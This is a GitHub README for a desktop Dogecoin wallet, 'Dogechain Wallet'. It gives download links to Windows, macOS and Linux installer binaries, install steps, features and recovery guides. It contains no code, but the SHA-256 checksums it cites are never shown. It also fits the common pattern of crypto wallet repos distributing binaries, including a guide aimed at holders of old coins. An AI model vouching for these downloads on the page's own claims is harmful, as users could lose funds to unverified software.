<p align="center">
  <img src="https://github.com/dogechain-developments/dogechain-wallet-docs/raw/HEAD/assets/banner-hub.png" alt="Dogechain Wallet" width="100%">
</p>

<h1 align="center">Dogechain Wallet — Guides and Docs</h1>

<p align="center"><strong>Free, open-source, non-custodial Dogecoin wallet for Windows, macOS and Linux — SPV sync in minutes, not a 150+ GB chain download.</strong></p>

<p align="center">
  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14"><img src="https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817" alt="Dogechain Wallet release v1.03.14"></a>
  <a href="https://github.com/dogechain-developments/dogechain-wallet-docs/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-705600?style=for-the-badge&labelColor=3D2817" alt="MIT license"></a>
  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14"><img src="https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817" alt="Windows, macOS and Linux"></a>
</p>

---

## ⬇️ Downloads — v1.03.14

<p align="center">
  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 **Windows** | Windows 10 or later, 64-bit | [`dogechain-wallet-v1.03.14.exe`](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe) |
| 🍎 **macOS** | macOS 12 Monterey or later | [`dogechain-wallet-v1.03.14.dmg`](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg) |
| 🐧 **Linux** | Ubuntu 22.04+ or equivalent, 64-bit | [`dogechain-wallet-v1.03.14.zip`](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip) |

All versions and checksums are on the [v1.03.14 release page](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14).

SHA-256 checksums are published on the [v1.03.14 release page](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14); compare your download there before installing.

> [!WARNING]
> Only download from this GitHub release page. Compare the SHA-256 of the file you saved with the published value before you install, and never share your seed phrase, private key or wallet password with anyone who offers help.

---

## 🧰 Install

<details open>
<summary>🪟 Windows 10 or later</summary>

1. Download the Windows installer from the table above and save it to your Downloads folder.
2. In File Explorer, right-click the file, choose **Properties**, open the **Digital signatures** tab if present, and note the signer. Then compare the file hash with the published SHA-256 before running anything.
3. Run the installer. If Windows SmartScreen shows a warning, review it and continue only when the file hash matches the published value. Do not disable Microsoft Defender or exclude your Downloads folder to get past a warning.
4. Launch Dogechain Wallet from the Start menu and let the header sync finish. The first sync is the long one; later launches reconnect quickly.
5. Create a new wallet or restore an existing one from your own backup, then write the recovery phrase down on paper and store it offline.

</details>

<details>
<summary>🍎 macOS 12 Monterey or later</summary>

1. Download the macOS disk image and save it to your Downloads folder.
2. Verify it in Terminal with the published SHA-256 before mounting it. A mismatch means the download is not the file the project published.
3. Open the disk image and drag Dogechain Wallet into Applications.
4. On first launch, if macOS blocks the app, open **System Settings → Privacy & Security**, find the blocked item and use **Open Anyway** only after the hash matches. Do not strip quarantine attributes or disable Gatekeeper.
5. Let the header sync finish, then create or restore your wallet and store the recovery phrase offline.

</details>

<details>
<summary>🐧 Ubuntu 22.04+ or equivalent</summary>

1. Download the Linux archive and verify its SHA-256 with a checksum tool before extracting it.
2. Extract the archive into a folder you control, for example your home directory.
3. Make the application file executable, then start it from a terminal or your file manager so you can see any startup error.
4. If the AppImage does not start, confirm that FUSE support is installed on your distribution and that you extracted the archive completely. Do not run the wallet with sandboxing disabled.
5. Let the header sync finish, then create or restore your wallet and store the recovery phrase offline.

</details>

The wallet needs no separate node, account or extra dependency: the installer is the application.

---

## ⚙️ Features

- **SPV sync** — downloads block headers only, so first sync takes minutes and the wallet store stays under 100 MB instead of the 150+ GB full chain.
- **Non-custodial keys** — private keys are generated and encrypted on your device and are never transmitted to a server.
- **BIP-39 backup** — a 12- or 24-word recovery phrase that other BIP-39 compatible wallets can read.
- **Built-in swap** — exchange DOGE for BTC, ETH, USDT and other assets through ChangeNOW without leaving the app; the provider sets its own limits, rates and checks.
- **Send and receive** — QR address sharing and a fee choice before you confirm a transfer.
- **Three desktop platforms** — Windows 10+, macOS 12 Monterey+ and Ubuntu 22.04+ or equivalent, all 64-bit.
- **Libdogecoin v0.1.4** — built on the Dogecoin Foundation C library for protocol and cryptographic primitives.
- **Independent security assessment** — a Hacken assessment is referenced by the project.
- **Free and open source** — no account, no subscription, no server-side wallet.

---

## 📚 Guides

| Guide | What it covers |
|:--|:--|
| [Dogechain Wallet for Windows — Setup and Sync](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogechain-wallet-windows-setup.md) | The full Windows install and first-sync walkthrough. |
| [Dogechain Wallet for macOS — Setup and Sync](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogechain-wallet-macos-setup.md) | Install on Apple silicon or Intel and verify the download. |
| [Dogechain Wallet for Linux — Setup Guide](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogechain-wallet-linux-setup.md) | Archive, AppImage permissions and first launch. |
| [How to Properly Back Up Your Dogecoin Wallet](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/how-to-backup-dogecoin-wallet.md) | What a usable backup contains and how to check it. |
| [dogechain.info Is Shut Down — How to Access Your Old Coins](https://github.com/dogechain-developments/dogechain-wallet-docs/blob/main/docs/dogechain-info-shut-down-how-to-recover.md) | Separate account access from exported wallet material. |

[Task-level guides in learn →](https://github.com/dogechain-developments/learn)

---

## 🔐 Security

**Your recovery phrase is the wallet. Nobody — including this project — can restore funds without it, and no legitimate helper will ever ask you to share it.**

---

## 🛟 Support

Open an issue in the application repository for reproducible bugs, and read the guides before posting: never attach a wallet file, seed phrase, private key, password or a screenshot that shows one.

- [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
- [All releases](https://github.com/dogechain-developments/Dogechain-Wallet/releases)
- [Dogechain Wallet learn hub](https://github.com/dogechain-developments/learn)

---

## 🧭 About this repository

This repository holds the Dogechain Wallet documentation articles: platform setup, wallet use, recovery, comparisons and security notes. The articles keep their original file names and paths so existing links continue to work, and they now point to the current v1.03.14 release and its installers.

---

## ⚖️ License

This repository is released under the **MIT** license.
